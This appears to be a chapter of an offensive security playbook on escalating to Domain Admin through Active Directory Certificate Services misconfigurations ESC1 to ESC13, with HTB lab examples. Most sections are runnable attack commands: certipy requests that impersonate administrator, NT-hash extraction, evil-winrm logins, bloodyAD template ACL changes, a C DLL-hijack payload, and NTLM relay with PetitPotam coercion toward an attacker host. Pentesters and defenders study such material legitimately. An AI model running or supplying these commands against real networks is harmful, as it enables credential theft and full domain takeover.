---
title: "05 · ADCS Certificate Attacks (ESC1–13)"
---

# 05 · ADCS Certificate Attacks (ESC1–13)

> Active Directory Certificate Services is a goldmine. Misconfigured templates → certs as Domain Admin.

!!! note "Phase overview"
    AD CS issues client-auth certificates. If you can get a cert with someone else's identity (UPN, SID, DNS name), you authenticate to Kerberos via PKINIT as that person. The ESC1–ESC13 family of misconfigurations all give you that capability through different means: ESC1 is template-level (you control the SAN), ESC4 is ACL-level (you can modify the template), ESC8 is relay-level (HTTP enrollment without signing), ESC13 is the newest (OID linked to a group → PAC injection).

### 5.0 · Enumeration First (certipy find)

!!! info "Why this works / how it chains"

    certipy find walks the CA and enumerates every template, EKU, and ACL. The -vulnerable flag pre-classifies templates by ESC number. If you have only a hash or a TGT, certipy supports both note the -k flag for Kerberos auth.

```bash title="Find vulnerable templates"
# With password
certipy find -u user@domain.local -p pass \
  -dc-ip <IP> -vulnerable -stdout -enabled

# With hash
certipy find \
  -u 'user$@domain.local' \
  -hashes ':NTLMHASH' \
  -target dc01.domain.local \
  -dc-ip <IP> \
  -vulnerable -stdout -enabled

# With Kerberos + clock skew
faketime -f "+7h" certipy find \
  -u user@domain.local \
  -k -no-pass \
  -target dc01.domain.local \
  -dc-ip <IP> \
  -vulnerable -stdout -enabled
```

``` title="Template flags → ESC number"
EnrolleeSuppliesSubject = True        → ESC1 candidate
Any Purpose EKU                       → ESC2 candidate
Enrollment Agent EKU                  → ESC3 candidate
WriteDACL/GenericWrite on template    → ESC4
EDITF_ATTRIBUTESUBJECTALTNAME2 on CA  → ESC6
HTTP enrollment enabled               → ESC8 (relay)
Issuance Policy linked to group       → ESC13
```


### 5.1 · ESC1: Enrollee Supplies Subject (SAN)

!!! info "Why this works / how it chains"

    The CA lets you supply ANY Subject Alternative Name (SAN) on the cert request. Set the SAN's UPN to administrator@domain.local, request the cert, then PKINIT as administrator. This is the canonical ADCS escalation. Since KB5014754 (May 2022), include -sid for strong cert mapping or auth will fail on patched DCs.

!!! warning "What leads here"
    - EnrolleeSuppliesSubject = True on a template
    - Your user/group has Enrollment Rights
    - No Manager Approval required
    - Client Authentication EKU present

```bash title="Request cert as admin → PKINIT"
# Request cert as administrator
certipy req \
  -u user@domain.local -p pass \
  -ca 'domain-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@domain.local' \
  -dc-ip <IP>

# Strong cert mapping (KB5014754) - include SID
certipy req \
  -u user@domain.local -p pass \
  -ca 'domain-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@domain.local' \
  -sid 'S-1-5-21-XXX-500' \
  -dc-ip <IP>

# Authenticate → get NT hash
certipy auth -pfx administrator.pfx -dc-ip <IP>

# Use hash
evil-winrm -i dc01.domain.local -u administrator -H <NT_HASH>
```


### 5.1b · ESC1 via DLL Execution (LOGGING HTB technique)

!!! info "Why this works / how it chains"

    When the template is restricted to a group you can't directly authenticate as, you generate the keypair on Kali (keep the private key safe!), upload only the CSR, then execute certreq AS the privileged user via a DLL hijack (Phase 9). The certreq call needs -f and < NUL; without them it hangs forever waiting for a prompt, which freezes your DLL hijack. Then you download the cert and pair it with your private key into a PFX.

!!! warning "What leads here"
    - Template enrollable only by a specific group you can reach via code execution
    - EnrolleeSuppliesSubject = True
    - Need a cert for a specific hostname (e.g. wsus.logging.htb for fake WSUS)
    - Have code execution as member of that group via a DLL hijack or scheduled task

```python title="1. Generate key + CSR on attacker"
python3 << 'EOF'
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
open('target_key.pem', 'wb').write(pk.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.TraditionalOpenSSL,
    serialization.NoEncryption()))
csr = (x509.CertificateSigningRequestBuilder()
       .subject_name(x509.Name([
           x509.NameAttribute(NameOID.COMMON_NAME, 'target.domain.local')]))
       .add_extension(x509.SubjectAlternativeName([
           x509.DNSName('target.domain.local')]), critical=False)
       .sign(pk, hashes.SHA256()))
open('req.csr', 'wb').write(csr.public_bytes(serialization.Encoding.DER))
print("Done! target_key.pem and req.csr generated")
EOF
```

```c title="2. DLL that submits the CSR as privileged user"
// cert_submit.c compiled to DLL, dropped into hijack path
#include <windows.h>
__declspec(dllexport) void ExportedFunction(void) {
    WinExec("cmd /c certreq -f -submit "
            "-attrib \"CertificateTemplate:TemplateName\" "
            "-config \"DC01.domain.local\\domain-CA\" "
            "C:\\path\\req.csr "
            "C:\\path\\cert.cer "
            "> C:\\path\\submit_log.txt 2>&1 < NUL", 0);
    // -f = force overwrite, < NUL = no interactive prompts
}
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}
```

```bash title="3. Compile + verify arch"
# Compile 32-bit (check target process architecture first!)
i686-w64-mingw32-gcc -shared -o target.dll cert_submit.c -s
file target.dll  # must show PE32 not PE32+
```

```bash title="4. Build PFX from issued cert + your key"
openssl x509 -inform DER -in cert.cer -out cert.pem
cat cert.pem target_key.pem > chain.pem
openssl pkcs12 -export -inkey target_key.pem -in cert.pem \
  -out target.pfx -passout pass:''
```


### 5.2 · ESC2: Any Purpose EKU

!!! info "Why this works / how it chains"

    A cert with 'Any Purpose' EKU can be used for anything, including signing other cert requests on behalf of arbitrary users. So ESC2 is essentially a free enrollment-agent capability, exploitable like ESC3.

!!! warning "What leads here"
    - Template has 'Any Purpose' EKU or NO EKU at all
    - You can enroll on the template

```bash title="Enroll then request as admin"
certipy req -u user@domain.local -p pass \
  -ca 'domain-CA' -template 'ESC2Template' -dc-ip <IP>

# Use as enrollment agent → request on behalf of admin
certipy req -u user@domain.local -p pass \
  -ca 'domain-CA' -template 'User' \
  -on-behalf-of 'domain\administrator' \
  -pfx esc2.pfx -dc-ip <IP>

certipy auth -pfx administrator.pfx -dc-ip <IP>
```


### 5.3 · ESC3: Enrollment Agent Certificate

!!! info "Why this works / how it chains"

    Two-step: enroll on the agent template to get an enrollment agent cert, then use that to request a cert 'on behalf of' Administrator on a normal user template.

!!! warning "What leads here"
    - Template has 'Certificate Request Agent' EKU
    - Another template allows enrollment agents to enroll on behalf of others

```bash title="Two-step on-behalf-of"
# Step 1 - Get enrollment agent cert
certipy req -u user@domain.local -p pass \
  -ca 'domain-CA' \
  -template 'EnrollmentAgent' \
  -dc-ip <IP>

# Step 2 - Use agent cert to enroll on behalf of admin
certipy req -u user@domain.local -p pass \
  -ca 'domain-CA' \
  -template 'User' \
  -on-behalf-of 'domain\administrator' \
  -pfx agent.pfx \
  -dc-ip <IP>

certipy auth -pfx administrator.pfx -dc-ip <IP>
```


### 5.4 · ESC4: Write Access to Template

!!! info "Why this works / how it chains"

    ESC4 isn't an attack on its own; it's a way to CONVERT into ESC1. You modify the target template's msPKI-Certificate-Name-Flag to enable EnrolleeSuppliesSubject, then exploit it as ESC1. The flag-flip trick (write a junk value first, then the real value) is required because the attribute may not exist yet on the object.

!!! warning "What leads here"
    - BloodHound shows WriteDACL/GenericWrite/GenericAll on a template object
    - You can modify template attributes, turning ANY template into an ESC1

```bash title="Method 1 : certipy template"
# Method 1: certipy template modification
certipy template \
  -u user@domain.local -p pass \
  -template 'VulnerableTemplate' \
  -save-old \
  -dc-ip <IP>
# Then exploit as ESC1
```

```bash title="Method 2 : bloodyAD (works cross-forest, Kerberos)"
# Grant GenericAll on template object
KRB5CCNAME=user.ccache faketime '-7 seconds' \
  proxychains4 -q bloodyAD \
  --host dc1.domain.local --dc-ip <IP> \
  -d domain.local -u 'user@domain.local' -k \
  add genericAll \
  'CN=TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' \
  'YourUserSID'

# Set msPKI-Certificate-Name-Flag to enable EnrolleeSuppliesSubject
# Flag value: -1577058303 (0xA2000001 with ENROLLEE_SUPPLIES_SUBJECT)
bloodyAD set object \
  'CN=TemplateName,CN=Certificate Templates,...' \
  msPKI-Certificate-Name-Flag -v 2717908993  # flip first

bloodyAD set object \
  'CN=TemplateName,CN=Certificate Templates,...' \
  msPKI-Certificate-Name-Flag -v -1577058303  # set ESC1

# Then exploit as ESC1 with -sid for strong mapping
certipy req -u user@domain.local -k -no-pass \
  -ca 'domain-CA' \
  -template 'TemplateName' \
  -upn 'Administrator@domain.local' \
  -sid 'S-1-5-21-XXX-500' \
  -dc-ip <IP>
```

```bash title="Cross-forest variant (PINGPONG technique)"
# R.Martinelli (PONG) has WriteDACL on SmartcardAuthentication template (PING)
# 1. Grant GenericAll
faketime '-7 seconds' proxychains4 -q bloodyAD \
  --host dc1.ping.htb --dc-ip $PING_IP \
  -d ping.htb -u 'R.Martinelli@pong.htb' -k \
  add genericAll \
  'CN=SmartcardAuthentication,CN=Certificate Templates,...' \
  'R.Martinelli-SID'

# 2. Modify name flags (flip-flop to register)
bloodyAD set object 'CN=SmartcardAuthentication,...' \
  msPKI-Certificate-Name-Flag -v 2717908993
bloodyAD set object 'CN=SmartcardAuthentication,...' \
  msPKI-Certificate-Name-Flag -v -1577058303

# 3. Pre-cache cross-realm tickets (required for cross-forest enrollment)
export KRB5CCNAME=$PWD/R.Martinelli@krbtgt_PING.HTB@PONG.HTB.ccache
faketime '-7 seconds' proxychains4 -q impacket-getST \
  -k -no-pass -dc-ip $PING_IP \
  -spn 'ldap/dc1.ping.htb' ping.htb/R.Martinelli
for spn in cifs/dc1.ping.htb host/dc1.ping.htb; do
  faketime '-7 seconds' proxychains4 -q impacket-getST \
    -k -no-pass -dc-ip $PING_IP \
    -spn "$spn" ping.htb/R.Martinelli
done

# Merge all tickets into one ccache
python3 << 'EOF'
from impacket.krb5.ccache import CCache
import glob
base = CCache.loadFile('R.Martinelli.ccache')
for f in glob.glob('R.Martinelli@*.ccache'):
    if 'merged' in f: continue
    try:
        c = CCache.loadFile(f)
        for cred in c.credentials:
            base.credentials.append(cred)
    except: pass
base.saveFile('merged.ccache')
EOF
export KRB5CCNAME=$PWD/merged.ccache

# 4. Use patched Certipy (if something wrong with the tool, this is for my case)
pipx uninstall certipy-ad
pipx install --force git+https://github.com/0xlazY/Certipy.git@trust_fix
pipx inject certipy-ad setuptools

# 5. Request cert with SID (strong mapping)
faketime '-7 seconds' proxychains4 -q certipy req \
  -k -no-pass \
  -target dc1.ping.htb -dc-ip $PING_IP \
  -ca 'ping-DC1-CA' \
  -template SmartcardAuthentication \
  -upn Administrator@ping.htb \
  -sid 'S-1-5-21-XXX-500' \
  -out admin_sid

# 6. PKINIT → NT hash
faketime '-7 seconds' proxychains4 -q certipy auth \
  -pfx admin_sid.pfx \
  -dc-ip $PING_IP \
  -domain ping.htb \
  -username Administrator
```


### 5.6 · ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on CA

!!! info "Why this works / how it chains"

    When this CA-level flag is set, the CA accepts a user-supplied SAN on ANY template; even templates that don't have EnrolleeSuppliesSubject set. So you exploit a normal template like User exactly like you would ESC1.

!!! warning "What leads here"
    - CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set
    - Any template with Client Auth EKU becomes ESC1-like (because the CA itself accepts user-supplied SAN)

```bash title="Exploit normal template as ESC1"
# Check CA flag
certipy find -u user@domain.local -p pass -dc-ip <IP> -stdout
# Look for: User Specified SAN: Enabled

# Exploit like ESC1 but on User template
certipy req -u user@domain.local -p pass \
  -ca 'domain-CA' \
  -template 'User' \
  -upn 'administrator@domain.local' \
  -dc-ip <IP>

certipy auth -pfx administrator.pfx -dc-ip <IP>
```


### 5.7 · ESC7: CA Officer/Manager Rights

!!! info "Why this works / how it chains"

    Two paths: (1) flip the EDITF flag to enable ESC6 across all templates, or (2) submit a request as administrator that gets queued for approval, then approve it yourself with your CA Manager rights and retrieve the cert.

!!! warning "What leads here"
    - Your account has ManageCertificates or ManageCA rights
    - Can approve pending requests or modify CA settings

```bash title="Method 1: enable ESC6"
# Method 1: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (becomes ESC6)
certipy ca -u user@domain.local -p pass \
  -ca 'domain-CA' \
  -enable-userspecifiedsan \
  -dc-ip <IP>
```

```bash title="Method 2: approve own pending request"
# Method 2: Issue failed/pending cert
# First request as admin (will fail, note RequestID)
certipy req -u user@domain.local -p pass \
  -ca 'domain-CA' \
  -template 'SubCA' \
  -upn 'administrator@domain.local' \
  -dc-ip <IP>

# Issue the pending request as CA Manager
certipy ca -u user@domain.local -p pass \
  -ca 'domain-CA' \
  -issue-request <REQUEST_ID> \
  -dc-ip <IP>

# Retrieve issued cert
certipy req -u user@domain.local -p pass \
  -ca 'domain-CA' \
  -retrieve <REQUEST_ID> \
  -dc-ip <IP>

certipy auth -pfx administrator.pfx -dc-ip <IP>
```


### 5.8 · ESC8: NTLM Relay to HTTP Enrollment

!!! info "Why this works / how it chains"

    ADCS web enrollment (the /certsrv endpoint) accepts NTLM. Coerce a DC's machine account to authenticate to you, relay that auth to the CA's HTTP enrollment, request a DomainController-template cert, and you now have a cert as the DC machine account, which has DCSync rights.

!!! warning "What leads here"
    - Web enrollment enabled on CA (HTTP/HTTPS at /certsrv)
    - SMB signing disabled OR you can coerce auth (Phase 22)
    - Can relay a machine account hash

```bash title="Coerce + relay → DC cert"
# Setup relay to CA enrollment
certipy relay -ca <CA_IP> -template DomainController

# Coerce DC authentication (triggers machine account auth)
printerbug.py domain.local/user:pass@<DC_IP> <ATTACKER_IP>
PetitPotam.py -u user -p pass <ATTACKER_IP> <DC_IP>

# Gets DC cert → authenticate as DC → DCSync
certipy auth -pfx dc01.pfx -dc-ip <IP>
```


### 5.9 · ESC9: No Security Extension

!!! info "Why this works / how it chains"

    When the security extension (which embeds the SID into the cert) is missing, the KDC falls back to UPN matching. Change your target user's UPN to administrator's UPN, request a cert (the cert's UPN field will be 'administrator'), restore the original UPN, then auth with the cert; the KDC matches the UPN to administrator.

!!! warning "What leads here"
    - Template has CT_FLAG_NO_SECURITY_EXTENSION
    - StrongCertificateBindingEnforcement = 0 or 1 (not 2)
    - GenericWrite on the target user

```bash title="UPN swap → cert → restore"
# Change target's UPN to admin's UPN
certipy account update \
  -u user@domain.local -p pass \
  -user targetuser \
  -upn administrator \
  -dc-ip <IP>

# Request cert as targetuser
certipy req -u targetuser@domain.local -p targetpass \
  -ca 'domain-CA' -template 'ESC9Template' -dc-ip <IP>

# Restore UPN
certipy account update \
  -u user@domain.local -p pass \
  -user targetuser \
  -upn targetuser@domain.local \
  -dc-ip <IP>

# Authenticate (cert has admin UPN, no security extension)
certipy auth -pfx targetuser.pfx -domain domain.local -dc-ip <IP>
```


### 5.10 · ESC10: Weak Certificate Mapping

!!! info "Why this works / how it chains"

    Same idea as ESC9 but exploits a weak DC-side mapping config rather than a missing template extension. The exploit flow is identical: swap UPN, request cert, swap back, authenticate.

!!! warning "What leads here"
    - CertificateMappingMethods includes UPN mapping
    - StrongCertificateBindingEnforcement = 0
    - GenericWrite on target

```bash title="ESC10 exploit"
# Similar to ESC9 - change UPN, request cert, auth
# Case A: StrongCertificateBindingEnforcement = 0
certipy account update -u user@domain.local -p pass \
  -user targetuser -upn administrator -dc-ip <IP>

certipy req -u targetuser@domain.local -p pass \
  -ca 'domain-CA' -template 'User' -dc-ip <IP>

certipy auth -pfx targetuser.pfx -domain domain.local -dc-ip <IP>
```


### 5.11 · ESC11: IF_ENFORCEENCRYPTICERTREQUEST Disabled

!!! info "Why this works / how it chains"

    Same family as ESC8 but uses RPC enrollment instead of HTTP. Useful when the web enrollment endpoint isn't exposed but RPC is. certipy handles the relay automatically with -rpc.

!!! warning "What leads here"
    - CA has IF_ENFORCEENCRYPTICERTREQUEST flag NOT set
    - Can relay RPC enrollment (not just HTTP)

```bash title="RPC relay"
certipy relay -ca <CA_IP> -template DomainController -rpc
```


### 5.13 · ESC13: OID Group Link (Issuance Policy)

!!! info "Why this works / how it chains"

    ESC13 is subtle. The cert itself doesn't authenticate as anyone special, but the TGT issued from PKINIT contains the SID of the OID-linked group in your PAC. So if 'TempWinRMAccess' has WinRM rights and the template's OID is linked to it, your TGT effectively grants you that membership without you actually being in the group.

!!! warning "What leads here"
    - Template has an Issuance Policy OID linked to a group
    - When you auth with this cert, KDC adds linked group SID to your PAC
    - Effectively grants group membership WITHOUT changing AD groups
    - Signs: certipy shows 'OID linked to group' or ESC13 flag

```bash title="Auto-detect + exploit"
# Certipy detects and exploits automatically
certipy find -u user@domain.local -k -no-pass \
  -dc-ip <IP> -target dc1.domain.local \
  -vulnerable -stdout
# Look for: ESC13, OID linked to group TempWinRMAccess or similar

# Request the cert
certipy req -u 'user@domain.local' -k -no-pass \
  -dc-ip <IP> -dc-host dc1.domain.local \
  -target dc1.domain.local \
  -ca 'domain-CA' -template 'TemporaryWinRM'

# PKINIT auth → TGT now contains linked group SID in PAC
certipy auth -pfx user.pfx -dc-ip <IP> \
  -domain domain.local -username user
# The TGT now grants you membership in the linked group!

export KRB5CCNAME=user.ccache
evil-winrm -i dc1.domain.local -r DOMAIN.LOCAL
# You now have WinRM access granted by the linked group!
```

!!! tip "Thought process"
    ESC13 is subtle; the cert itself doesn't give access, but the TGT issued from it contains extra group SIDs. If TempWinRMAccess group has WinRM rights, your TGT gets that SID → WinRM access without being in the group.

